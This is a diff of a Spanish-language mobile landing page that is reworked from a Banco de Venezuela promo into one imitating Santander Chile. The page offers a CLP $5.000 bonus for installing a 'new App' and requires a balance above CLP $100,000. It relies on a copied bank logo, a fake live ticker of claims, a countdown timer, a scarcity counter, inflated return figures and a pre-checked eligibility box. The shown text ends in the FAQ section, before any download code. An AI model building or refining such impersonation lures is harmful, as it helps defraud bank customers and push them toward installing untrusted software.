@@ -1,244 +1,795 @@
 <!DOCTYPE html>
-<html lang="es" class="dark">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inversión BDV - Gana 5,000 Bs</title>
-    <!-- Tailwind CSS CDN -->
+    <title>Inversión Exclusiva Chile - Bono CLP $5.000 | Santander CL</title>
+    <!-- 加载 Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
+    <!-- 加载 Inter 字体 -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <script>
         tailwind.config = {
-            darkMode: 'class',
             theme: {
                 extend: {
+                    fontFamily: {
+                        sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+                    },
                     colors: {
-                        bdvBlue: '#003366',
-                        bdvLightBlue: '#0055A5',
-                        bdvGold: '#D4AF37',
-                        bdvGreen: '#10B981',
+                        santander: {
+                            red: '#EC0000',
+                            dark: '#B80000',
+                            cta: '#D50000',
+                            lightBg: '#F4F6F9'
+                        }
+                    },
+                    boxShadow: {
+                        'icon': '0 12px 28px -6px rgba(236, 0, 0, 0.38), 0 6px 12px -4px rgba(236, 0, 0, 0.2)',
+                        'card': '0 10px 30px -10px rgba(15, 23, 42, 0.08)',
+                        'cta': '0 12px 24px -6px rgba(213, 0, 0, 0.45)',
+                        'mobile': '0 25px 60px -15px rgba(0, 0, 0, 0.18)'
                     }
                 }
             }
         }
     </script>
-    <!-- Google Fonts Inter -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <!-- FontAwesome for icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
+        /* 自定义滑块样式，打造精致金融科技手感 */
+        input[type="range"].clp-slider {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 100%;
+            height: 8px;
+            border-radius: 999px;
+            background: linear-gradient(90deg, #EC0000 0%, #EC0000 var(--progress, 18%), #E5E7EB var(--progress, 18%), #E5E7EB 100%);
+            outline: none;
+            cursor: pointer;
         }
-        .hero-gradient {
-            background: linear-gradient(135deg, #002244 0%, #004488 100%);
+        input[type="range"].clp-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #FFFFFF;
+            border: 4px solid #EC0000;
+            box-shadow: 0 4px 10px rgba(236, 0, 0, 0.35);
+            cursor: pointer;
+            transition: transform 0.15s ease;
         }
-        .card-glow {
-            box-shadow: 0 10px 30px -10px rgba(0, 85, 165, 0.3);
+        input[type="range"].clp-slider::-webkit-slider-thumb:hover {
+            transform: scale(1.12);
         }
-        @keyframes pulse-slow {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.03); }
+        input[type="range"].clp-slider::-moz-range-thumb {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #FFFFFF;
+            border: 4px solid #EC0000;
+            box-shadow: 0 4px 10px rgba(236, 0, 0, 0.35);
+            cursor: pointer;
+            transition: transform 0.15s ease;
         }
-        .animate-pulse-slow {
-            animation: pulse-slow 3s infinite ease-in-out;
+
+        /* 按钮呼吸微光动效 */
+        @keyframes pulseGlow {
+            0%, 100% {
+                box-shadow: 0 10px 24px -4px rgba(213, 0, 0, 0.45), 0 0 0 0 rgba(236, 0, 0, 0.35);
+            }
+            50% {
+                box-shadow: 0 14px 28px -4px rgba(213, 0, 0, 0.55), 0 0 0 7px rgba(236, 0, 0, 0);
+            }
+        }
+        .cta-pulse {
+            animation: pulseGlow 2.4s infinite;
+        }
+
+        /* 悬浮金币上下微浮动 */
+        @keyframes floatCoin {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-4px); }
+        }
+        .coin-float {
+            animation: floatCoin 3s ease-in-out infinite;
+        }
+
+        /* 隐藏滚动条但保留滚动能力 */
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
         }
     </style>
 </head>
-<body class="bg-slate-900 text-slate-100 min-h-screen flex flex-col justify-between selection:bg-cyan-500 selection:text-white">
+<body class="bg-slate-200/80 min-h-screen flex justify-center items-start sm:py-6 font-sans antialiased text-slate-800 selection:bg-red-100 selection:text-red-700">
 
-    <!-- Top Notification Bar -->
-    <header class="bg-emerald-600/90 text-white text-xs font-medium py-2 px-4 text-center sticky top-0 z-50 shadow-md">
-        <i class="fa-solid fa-gift mr-1 animate-bounce"></i> ¡Bono de bienvenida! Descarga y cumple los requisitos para ganar <strong>5.000 Bs</strong>
-    </header>
+    <!-- 移动端主容器：桌面端居中展示(max-w-[430px])，手机端全屏铺满 -->
+    <main class="w-full max-w-[430px] min-h-screen bg-[#F5F7FA] sm:rounded-[38px] sm:shadow-mobile flex flex-col relative overflow-x-hidden sm:border sm:border-white">
 
-    <!-- Main Container -->
-    <main class="w-full max-w-md mx-auto flex-grow flex flex-col px-4 py-6 space-y-6">
-
-        <!-- Brand Header / Logo -->
-        <div class="flex items-center justify-between bg-slate-800/80 backdrop-blur-md p-4 rounded-2xl border border-slate-700">
-            <div class="flex items-center space-x-3">
-                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-blue-600 to-cyan-400 flex items-center justify-center text-white font-black text-xl shadow-lg">
-                    <i class="fa-solid fa-building-columns"></i>
-                </div>
-                <div>
-                    <h1 class="font-bold text-base text-white tracking-wide">Banco de Venezuela</h1>
-                    <p class="text-xs text-cyan-400 font-medium">Plataforma de Inversión Oficial</p>
-                </div>
+        <!-- 1. 顶部实时信任状态栏 + 倒计时 -->
+        <header class="bg-gradient-to-r from-[#B80000] via-[#EC0000] to-[#D50000] text-white px-4 py-2.5 flex items-center justify-between text-[11px] font-semibold sticky top-0 z-30 shadow-sm">
+            <div class="flex items-center gap-1.5">
+                <span class="relative flex h-2 w-2">
+                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-300 opacity-75"></span>
+                    <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-400"></span>
+                </span>
+                <span class="tracking-tight">Beneficio Exclusivo Clientes Santander CL</span>
             </div>
-            <div class="bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs px-2.5 py-1 rounded-full font-semibold">
-                <i class="fa-solid fa-shield-halved mr-1"></i> Verificado
+            <div class="bg-black/25 backdrop-blur-xs px-2 py-0.5 rounded-md font-mono text-[11px] font-bold tracking-wider flex items-center gap-1">
+                <svg class="w-3 h-3 text-amber-300" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                </svg>
+                <span id="countdownTimer">14:59</span>
             </div>
+        </header>
+
+        <!-- 智利各城市客户实时领取动态播报条 -->
+        <div class="bg-white border-b border-slate-200/80 px-4 py-2 flex items-center justify-between text-[11.5px] text-slate-600">
+            <div class="flex items-center gap-2 overflow-hidden">
+                <span class="inline-flex items-center px-1.5 py-0.5 rounded text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-200 shrink-0">
+                    EN VIVO
+                </span>
+                <p id="liveClaimTicker" class="truncate font-medium transition-opacity duration-300">
+                    Camila M. (Santiago) activó su bono de <strong class="text-slate-900">CLP $5.000</strong> hace 1 min
+                </p>
+            </div>
+            <span class="text-[10px] font-bold text-[#EC0000] shrink-0 ml-2">42 cupos hoy</span>
         </div>
 
-        <!-- Hero Banner Card -->
-        <section class="hero-gradient rounded-3xl p-6 text-white card-glow relative overflow-hidden border border-blue-500/30">
-            <!-- Background Decorative Elements -->
-            <div class="absolute -right-10 -bottom-10 w-40 h-40 bg-blue-500/20 rounded-full blur-2xl pointer-events-none"></div>
-            
-            <div class="relative z-10 space-y-4">
-                <div class="inline-flex items-center space-x-2 bg-amber-400/20 border border-amber-400/40 text-amber-300 text-xs px-3 py-1 rounded-full font-bold uppercase tracking-wider">
-                    <i class="fa-solid fa-bolt text-amber-400"></i> Oportunidad Exclusiva
-                </div>
-                
-                <h2 class="text-2xl sm:text-3xl font-extrabold leading-tight tracking-tight">
-                    Haz crecer tu capital con tu cuenta <span class="text-cyan-300">BDV</span>
-                </h2>
-                
-                <p class="text-sm text-slate-300 leading-relaxed">
-                    Invierte de manera segura y rentable. Solo necesitas un saldo mínimo a partir de <strong class="text-white font-bold bg-blue-900/60 px-1.5 py-0.5 rounded border border-blue-400/30">50.000 Bs</strong> en tu cuenta del Banco de Venezuela.
-                </p>
+        <!-- 主体滚动内容区（底部留足空间给悬浮 CTA） -->
+        <div class="flex-1 px-4 pt-6 pb-36 space-y-5 relative">
 
-                <!-- Reward Highlight Box -->
-                <div class="bg-gradient-to-r from-emerald-900/80 to-slate-900/90 border border-emerald-500/40 rounded-2xl p-4 flex items-center space-x-4">
-                    <div class="w-12 h-12 rounded-xl bg-emerald-500 text-slate-950 flex items-center justify-center text-2xl font-black shrink-0 shadow-lg">
-                        <i class="fa-solid fa-coins"></i>
-                    </div>
-                    <div>
-                        <div class="text-xs text-emerald-300 font-semibold uppercase tracking-wider">Bono Directo</div>
-                        <div class="text-lg font-black text-white">+5.000 Bs <span class="text-xs font-normal text-slate-300">de recompensa</span></div>
-                        <div class="text-[11px] text-slate-400">Al descargar, registrarte y cumplir condiciones.</div>
+            <!-- 顶部红色氛围光晕 -->
+            <div class="absolute top-0 left-1/2 -translate-x-1/2 w-80 h-60 bg-red-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+            <!-- 2. Hero 核心视觉与主文案区 -->
+            <section class="bg-white rounded-3xl p-6 shadow-card border border-slate-100 relative overflow-hidden text-center">
+                <!-- 严格保留的 Santander CL 圆角方形图标 -->
+                <div class="mb-4 flex justify-center">
+                    <div class="w-[88px] h-[88px] rounded-[22px] bg-[#EC0000] shadow-icon flex items-center justify-center relative overflow-hidden transition-transform duration-300 hover:scale-105">
+                        <svg viewBox="0 0 180 180" class="w-full h-full" xmlns="http://www.w3.org/2000/svg" aria-label="Santander CL">
+                            <rect width="180" height="180" rx="40" fill="#EC0000"/>
+                            <text x="122" y="53" fill="#FFFFFF" font-family="Inter, Arial, sans-serif" font-weight="700" font-size="27" letter-spacing="-0.5">CL</text>
+                            <g transform="translate(0, 4)">
+                                <ellipse cx="90" cy="113" rx="64" ry="27" fill="#FFFFFF"/>
+                                <path d="M 76 123 C 54 98, 56 68, 72 48 C 72 68, 86 83, 86 105 C 86 113, 81 119, 76 123 Z" fill="#FFFFFF" stroke="#EC0000" stroke-width="5.5" stroke-linejoin="round"/>
+                                <path d="M 91 129 C 69 96, 74 52, 91 22 C 91 50, 113 68, 113 96 C 113 111, 102 121, 91 129 Z" fill="#FFFFFF" stroke="#EC0000" stroke-width="5.5" stroke-linejoin="round"/>
+                                <path d="M 105 123 C 122 103, 122 77, 107 58 C 107 75, 95 88, 95 107 C 95 114, 100 119, 105 123 Z" fill="#FFFFFF" stroke="#EC0000" stroke-width="5.5" stroke-linejoin="round"/>
+                            </g>
+                        </svg>
                     </div>
                 </div>
 
-                <!-- Call To Action Button -->
-                <div class="pt-2">
-                    <button onclick="handleDownload()" class="w-full bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 font-extxl font-bold py-4 px-6 rounded-2xl shadow-xl hover:shadow-emerald-500/25 transition-all transform active:scale-95 flex items-center justify-center space-x-2 text-base animate-pulse-slow">
-                        <span>Descargar y Reclamar 5.000 Bs</span>
-                        <i class="fa-solid fa-arrow-right-long"></i>
-                    </button>
-                    <p class="text-center text-[10px] text-slate-400 mt-2">
-                        <i class="fa-solid fa-lock mr-1"></i> Transacción protegida y cifrada SSL
+                <!-- 信任评分徽标 -->
+                <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-slate-50 border border-slate-200/80 text-[11px] font-semibold text-slate-600 mb-3">
+                    <span class="text-amber-400 text-xs">★★★★★</span>
+                    <span>4.9/5 App Inversión Chile</span>
+                </div>
+
+                <!-- 主标题 -->
+                <h1 class="text-[26px] leading-[1.15] font-black text-[#CC0000] tracking-tight mb-3">
+                    Inversión Exclusiva Chile
+                </h1>
+
+                <!-- 投资门槛高亮说明徽章 -->
+                <div class="bg-slate-900 text-white rounded-2xl px-4 py-3 mb-3.5 text-left flex items-center gap-3 shadow-sm">
+                    <div class="w-9 h-9 rounded-xl bg-amber-400/20 border border-amber-400/40 text-amber-300 flex items-center justify-center shrink-0">
+                        <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                        </svg>
+                    </div>
+                    <p class="text-[13px] leading-snug font-medium text-slate-100">
+                        Requiere saldo superior a <span class="text-amber-300 font-extrabold">CLP $100.000</span> en Santander Bank para invertir
                     </p>
                 </div>
-            </div>
-        </section>
 
-        <!-- Requirements Section -->
-        <section class="bg-slate-800/80 backdrop-blur-md rounded-2xl p-5 border border-slate-700 space-y-4">
-            <h3 class="font-bold text-sm text-slate-200 uppercase tracking-wider flex items-center">
-                <i class="fa-solid fa-list-check text-cyan-400 mr-2"></i> Requisitos para Invertir
-            </h3>
-            
-            <div class="space-y-3">
-                <div class="flex items-start space-x-3 bg-slate-900/50 p-3 rounded-xl border border-slate-800">
-                    <div class="w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-400 flex items-center justify-center text-xs font-bold shrink-0 mt-0.5">1</div>
-                    <div class="text-xs text-slate-300">
-                        <strong class="text-white block font-semibold mb-0.5">Cuenta BDV Activa</strong>
-                        Poseer cuenta corriente o de ahorros en el Banco de Venezuela.
+                <!-- 下载安装即得 CLP $5.000 奖励卡片 -->
+                <div class="bg-gradient-to-br from-red-50 via-red-50/80 to-amber-50/60 border border-red-200/80 rounded-2xl p-4 relative overflow-hidden">
+                    <div class="inline-block px-2.5 py-0.5 rounded-full bg-[#EC0000] text-white text-[10px] font-extrabold uppercase tracking-wider mb-1.5">
+                        Bono de Bienvenida Inmediato
+                    </div>
+                    <p class="text-[16.5px] leading-[1.35] font-extrabold text-slate-900">
+                        Descarga e instala la nueva App y recibe al instante un bono de <span class="text-[#EC0000] text-[19px] underline decoration-amber-400 decoration-2 underline-offset-2">CLP $5.000</span>
+                    </p>
+                </div>
+            </section>
+
+            <!-- 3. 智利比索 (CLP) 交互式投资收益与奖励模拟器 -->
+            <section class="bg-white rounded-3xl p-5 shadow-card border border-slate-100">
+                <div class="flex items-center justify-between mb-1">
+                    <h2 class="text-[16px] font-extrabold text-slate-900">
+                        Simula tu Inversión + Bono
+                    </h2>
+                    <span class="text-[11px] font-bold text-emerald-700 bg-emerald-50 border border-emerald-200 px-2.5 py-0.5 rounded-full">
+                        +11,4% anual est.
+                    </span>
+                </div>
+                <p class="text-xs text-slate-500 mb-4">
+                    Desliza según tu saldo disponible en Santander Bank (mín. CLP $100.000):
+                </p>
+
+                <!-- 选中金额展示 -->
+                <div class="bg-slate-50 rounded-2xl p-3.5 border border-slate-200/70 mb-4">
+                    <div class="flex items-baseline justify-between mb-2">
+                        <span class="text-xs font-semibold text-slate-500">Saldo a invertir:</span>
+                        <span id="selectedCapitalDisplay" class="text-2xl font-black text-slate-900 tracking-tight">CLP $500.000</span>
+                    </div>
+
+                    <!-- 交互滑块 (100,000 ~ 5,000,000 CLP) -->
+                    <input type="range" id="clpRangeSlider" class="clp-slider" min="100000" max="5000000" step="50000" value="500000" aria-label="Monto de inversión en CLP">
+                    
+                    <div class="flex justify-between text-[10.5px] font-semibold text-slate-400 mt-2">
+                        <span>Mín. $100.000</span>
+                        <span>$2.500.000</span>
+                        <span>$5.000.000</span>
+                    </div>
+
+                    <!-- 快捷金额标签 -->
+                    <div class="grid grid-cols-4 gap-1.5 mt-3">
+                        <button type="button" data-amount="100000" class="preset-btn py-1.5 rounded-lg text-[11px] font-bold bg-white border border-slate-200 text-slate-700 hover:border-[#EC0000] hover:text-[#EC0000] transition-colors cursor-pointer">$100 mil</button>
+                        <button type="button" data-amount="500000" class="preset-btn py-1.5 rounded-lg text-[11px] font-bold bg-red-50 border border-[#EC0000] text-[#EC0000] transition-colors cursor-pointer">$500 mil</button>
+                        <button type="button" data-amount="1500000" class="preset-btn py-1.5 rounded-lg text-[11px] font-bold bg-white border border-slate-200 text-slate-700 hover:border-[#EC0000] hover:text-[#EC0000] transition-colors cursor-pointer">$1,5M</button>
+                        <button type="button" data-amount="3000000" class="preset-btn py-1.5 rounded-lg text-[11px] font-bold bg-white border border-slate-200 text-slate-700 hover:border-[#EC0000] hover:text-[#EC0000] transition-colors cursor-pointer">$3M</button>
                     </div>
                 </div>
 
-                <div class="flex items-start space-x-3 bg-slate-900/50 p-3 rounded-xl border border-slate-800">
-                    <div class="w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-400 flex items-center justify-center text-xs font-bold shrink-0 mt-0.5">2</div>
-                    <div class="text-xs text-slate-300">
-                        <strong class="text-white block font-semibold mb-0.5">Saldo Mínimo de 50.000 Bs</strong>
-                        Disponer de un saldo igual o superior a 50.000 Bs en la cuenta para activar el perfil de inversionista.
+                <!-- 实时收益与CLP $5.000即时奖励对比卡片 -->
+                <div class="grid grid-cols-2 gap-2.5 mb-4">
+                    <div class="rounded-2xl bg-emerald-50/80 border border-emerald-200/80 p-3">
+                        <span class="block text-[10.5px] font-bold text-emerald-700 uppercase">Bono App Al Instante</span>
+                        <span class="block text-[17px] font-black text-emerald-700 mt-0.5">+ CLP $5.000</span>
+                        <span class="block text-[10px] text-emerald-600 mt-0.5">Acreditado al instalar</span>
+                    </div>
+                    <div class="rounded-2xl bg-slate-50 border border-slate-200/80 p-3">
+                        <span class="block text-[10.5px] font-bold text-slate-500 uppercase">Ganancia Est. 12 Meses</span>
+                        <span id="annualReturnDisplay" class="block text-[17px] font-black text-slate-900 mt-0.5">+ CLP $62.000</span>
+                        <span id="monthlyReturnDisplay" class="block text-[10px] text-slate-500 mt-0.5">~CLP $4.750 / mes + bono</span>
                     </div>
                 </div>
 
-                <div class="flex items-start space-x-3 bg-slate-900/50 p-3 rounded-xl border border-slate-800">
-                    <div class="w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-400 flex items-center justify-center text-xs font-bold shrink-0 mt-0.5">3</div>
-                    <div class="text-xs text-slate-300">
-                        <strong class="text-white block font-semibold mb-0.5">Instalación y Verificación</strong>
-                        Descargar la aplicación oficial desde este portal y completar el registro seguro.
+                <!-- 动态生长 SVG 金融图表 -->
+                <div class="rounded-2xl bg-gradient-to-b from-slate-50 to-white border border-slate-100 p-3 relative overflow-hidden">
+                    <div class="flex items-center justify-between text-[11px] font-semibold text-slate-500 mb-1">
+                        <span>Proyección de crecimiento</span>
+                        <span id="totalProjectedDisplay" class="text-[#EC0000] font-extrabold">Total est.: CLP $562.000</span>
+                    </div>
+                    <svg viewBox="0 0 320 125" class="w-full h-auto overflow-visible" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="areaFill" x1="0%" y1="0%" x2="0%" y2="100%">
+                                <stop offset="0%" stop-color="#EC0000" stop-opacity="0.22"/>
+                                <stop offset="100%" stop-color="#EC0000" stop-opacity="0.0"/>
+                            </linearGradient>
+                            <radialGradient id="goldCoin" cx="35%" cy="35%" r="65%">
+                                <stop offset="0%" stop-color="#FEF08A"/>
+                                <stop offset="60%" stop-color="#F59E0B"/>
+                                <stop offset="100%" stop-color="#B45309"/>
+                            </radialGradient>
+                        </defs>
+
+                        <!-- 背景参考虚线 -->
+                        <line x1="10" y1="30" x2="310" y2="30" stroke="#E2E8F0" stroke-dasharray="3 3" stroke-width="1"/>
+                        <line x1="10" y1="68" x2="310" y2="68" stroke="#E2E8F0" stroke-dasharray="3 3" stroke-width="1"/>
+                        <line x1="10" y1="105" x2="310" y2="105" stroke="#E2E8F0" stroke-width="1"/>
+
+                        <!-- 动态变化面积与折线 -->
+                        <path id="chartAreaPath" d="M 15 98 L 85 84 L 155 68 L 225 48 L 295 22 L 295 105 L 15 105 Z" fill="url(#areaFill)"/>
+                        <path id="chartLinePath" d="M 15 98 L 85 84 L 155 68 L 225 48 L 295 22" fill="none" stroke="#EC0000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+
+                        <!-- 起点CLP $5.000即时奖励标注 -->
+                        <circle cx="15" cy="98" r="5" fill="#10B981" stroke="#FFFFFF" stroke-width="2"/>
+                        <rect x="8" y="72" width="76" height="18" rx="6" fill="#059669"/>
+                        <text x="46" y="84" text-anchor="middle" fill="#FFFFFF" font-size="9.5" font-weight="800">+$5.000 Hoy</text>
+
+                        <!-- 终点动态圆点与悬浮金币 -->
+                        <g id="chartEndGroup" transform="translate(295, 22)">
+                            <circle cx="0" cy="0" r="6" fill="#EC0000" stroke="#FFFFFF" stroke-width="2.5"/>
+                            <g class="coin-float" transform="translate(-12, -22)">
+                                <circle cx="0" cy="0" r="11" fill="url(#goldCoin)" stroke="#FFFFFF" stroke-width="1.5"/>
+                                <text x="0" y="3.5" text-anchor="middle" fill="#78350F" font-size="10" font-weight="900">$</text>
+                            </g>
+                        </g>
+
+                        <!-- X轴月份标签 -->
+                        <text x="15" y="120" fill="#94A3B8" font-size="9.5" font-weight="600">Hoy</text>
+                        <text x="85" y="120" text-anchor="middle" fill="#94A3B8" font-size="9.5" font-weight="600">Mes 3</text>
+                        <text x="155" y="120" text-anchor="middle" fill="#94A3B8" font-size="9.5" font-weight="600">Mes 6</text>
+                        <text x="225" y="120" text-anchor="middle" fill="#94A3B8" font-size="9.5" font-weight="600">Mes 9</text>
+                        <text x="295" y="120" text-anchor="end" fill="#64748B" font-size="9.5" font-weight="700">Mes 12</text>
+                    </svg>
+                </div>
+            </section>
+
+            <!-- 4. 三步领取指南 -->
+            <section class="bg-white rounded-3xl p-5 shadow-card border border-slate-100">
+                <h2 class="text-[16px] font-extrabold text-slate-900 mb-4">
+                    ¿Cómo obtener tu bono de CLP $5.000?
+                </h2>
+
+                <div class="space-y-3.5 relative">
+                    <!-- 连接竖线 -->
+                    <div class="absolute left-[17px] top-6 bottom-6 w-0.5 bg-red-100"></div>
+
+                    <!-- 步骤 1 -->
+                    <div class="flex items-start gap-3.5 relative">
+                        <div class="w-9 h-9 rounded-full bg-red-50 border-2 border-[#EC0000] text-[#EC0000] font-black text-sm flex items-center justify-center shrink-0 z-10">
+                            1
+                        </div>
+                        <div class="pt-0.5">
+                            <h3 class="text-[13.5px] font-bold text-slate-900">Verifica tu saldo &gt; CLP $100.000 en Santander</h3>
+                            <p class="text-xs text-slate-500 mt-0.5 leading-relaxed">
+                                Asegúrate de mantener más de CLP $100.000 en tu cuenta Santander Bank para habilitar el acceso de inversión.
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- 步骤 2 -->
+                    <div class="flex items-start gap-3.5 relative">
+                        <div class="w-9 h-9 rounded-full bg-red-50 border-2 border-[#EC0000] text-[#EC0000] font-black text-sm flex items-center justify-center shrink-0 z-10">
+                            2
+                        </div>
+                        <div class="pt-0.5">
+                            <h3 class="text-[13.5px] font-bold text-slate-900">Descarga e instala la nueva App</h3>
+                            <p class="text-xs text-slate-500 mt-0.5 leading-relaxed">
+                                Pulsa el botón rojo inferior, copia tu código promocional único e instala la App oficial en iOS o Android.
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- 步骤 3 -->
+                    <div class="flex items-start gap-3.5 relative">
+                        <div class="w-9 h-9 rounded-full bg-emerald-500 text-white font-black text-sm flex items-center justify-center shrink-0 z-10 shadow-sm">
+                            ✓
+                        </div>
+                        <div class="pt-0.5">
+                            <h3 class="text-[13.5px] font-bold text-slate-900">Recibe CLP $5.000 al instante en tu cuenta</h3>
+                            <p class="text-xs text-slate-500 mt-0.5 leading-relaxed">
+                                Al completar la instalación e iniciar tu inversión, el bono de <strong class="text-emerald-700">CLP $5.000</strong> se abona inmediatamente.
+                            </p>
+                        </div>
                     </div>
                 </div>
-            </div>
-        </section>
+            </section>
 
-        <!-- Steps Guide -->
-        <section class="bg-slate-800/80 backdrop-blur-md rounded-2xl p-5 border border-slate-700 space-y-4">
-            <h3 class="font-bold text-sm text-slate-200 uppercase tracking-wider flex items-center">
-                <i class="fa-solid fa-shoe-prints text-amber-400 mr-2"></i> ¿Cómo participar?
-            </h3>
-            
-            <div class="grid grid-cols-3 gap-3 text-center">
-                <div class="bg-slate-900/60 p-3 rounded-xl border border-slate-800 flex flex-col items-center">
-                    <div class="w-9 h-9 rounded-full bg-blue-600/20 text-blue-400 flex items-center justify-center text-sm font-bold mb-2">
-                        <i class="fa-solid fa-download"></i>
-                    </div>
-                    <span class="text-[11px] font-semibold text-white block mb-1">1. Descarga</span>
-                    <span class="text-[10px] text-slate-400 leading-tight">Instala la app en tu móvil</span>
+            <!-- 5. 投资资格确认交互卡片 -->
+            <section id="eligibilitySection" class="bg-white rounded-3xl p-5 shadow-card border-2 border-red-100">
+                <div class="flex items-center gap-2 mb-2.5">
+                    <span class="w-2 h-2 rounded-full bg-[#EC0000]"></span>
+                    <span class="text-xs font-extrabold uppercase tracking-wider text-[#EC0000]">Validación de Requisito</span>
                 </div>
 
-                <div class="bg-slate-900/60 p-3 rounded-xl border border-slate-800 flex flex-col items-center">
-                    <div class="w-9 h-9 rounded-full bg-amber-600/20 text-amber-400 flex items-center justify-center text-sm font-bold mb-2">
-                        <i class="fa-solid fa-wallet"></i>
+                <label id="eligibilityBox" for="balanceConfirm" class="flex items-start gap-3.5 p-3.5 rounded-2xl bg-slate-50 border border-slate-200 cursor-pointer transition-all duration-200 hover:border-[#EC0000] select-none">
+                    <div class="relative flex items-center mt-0.5">
+                        <input type="checkbox" id="balanceConfirm" class="peer sr-only" checked>
+                        <div class="w-6 h-6 rounded-lg border-2 border-slate-300 bg-white peer-checked:bg-[#EC0000] peer-checked:border-[#EC0000] transition-colors flex items-center justify-center shadow-xs">
+                            <svg class="w-4 h-4 text-white opacity-0 peer-checked:opacity-100 transition-opacity" viewBox="0 0 20 20" fill="currentColor">
+                                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                            </svg>
+                        </div>
                     </div>
-                    <span class="text-[11px] font-semibold text-white block mb-1">2. Verifica</span>
-                    <span class="text-[10px] text-slate-400 leading-tight">Confirma tus 50k+ Bs</span>
-                </div>
-
-                <div class="bg-slate-900/60 p-3 rounded-xl border border-slate-800 flex flex-col items-center">
-                    <div class="w-9 h-9 rounded-full bg-emerald-600/20 text-emerald-400 flex items-center justify-center text-sm font-bold mb-2">
-                        <i class="fa-solid fa-gift"></i>
+                    <div class="flex-1">
+                        <span class="block text-[13.5px] leading-snug text-slate-800 font-bold">
+                            Confirmo que poseo más de <span class="text-[#EC0000]">CLP $100.000</span> en mi cuenta Santander Bank
+                        </span>
+                        <span id="eligibilityStatusBadge" class="inline-flex items-center gap-1 mt-1.5 text-[11px] font-bold text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-md">
+                            ✓ Calificas para invertir y recibir CLP $5.000
+                        </span>
                     </div>
-                    <span class="text-[11px] font-semibold text-white block mb-1">3. Gana</span>
-                    <span class="text-[10px] text-slate-400 leading-tight">Recibe tus 5.000 Bs</span>
+                </label>
+
+                <!-- 未勾选时的提示 -->
+                <div id="validationNotice" class="hidden mt-3 rounded-xl bg-amber-50 border border-amber-300 px-3.5 py-2.5 text-xs text-amber-900 flex items-center gap-2">
+                    <svg class="w-4 h-4 text-amber-600 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+                    </svg>
+                    <span>Marca la casilla confirmando tu saldo superior a <strong>CLP $100.000</strong> en Santander Bank para desbloquear tu bono.</span>
                 </div>
-            </div>
+            </section>
 
-            <button onclick="handleDownload()" class="w-full bg-slate-700 hover:bg-slate-600 text-white font-semibold py-3 px-4 rounded-xl text-xs transition border border-slate-600 flex items-center justify-center space-x-2">
-                <span>Comenzar Ahora</span>
-                <i class="fa-solid fa-chevron-right text-[10px]"></i>
-            </button>
-        </section>
+            <!-- 6. 智利投资者常见问题 FAQ 手风琴 -->
+            <section class="bg-white rounded-3xl p-5 shadow-card border border-slate-100">
+                <h2 class="text-[16px] font-extrabold text-slate-900 mb-3">
+                    Preguntas Frecuentes
+                </h2>
 
-        <!-- Trust & Security Indicators -->
-        <div class="flex items-center justify-center space-x-6 py-2 text-slate-400 text-xs">
-            <div class="flex items-center space-x-1.5">
-                <i class="fa-solid fa-shield text-emerald-400"></i>
-                <span>Fondos Seguros</span>
-            </div>
-            <div class="flex items-center space-x-1.5">
-                <i class="fa-solid fa-bolt text-amber-400"></i>
-                <span>Acreditación Rápida</span>
-            </div>
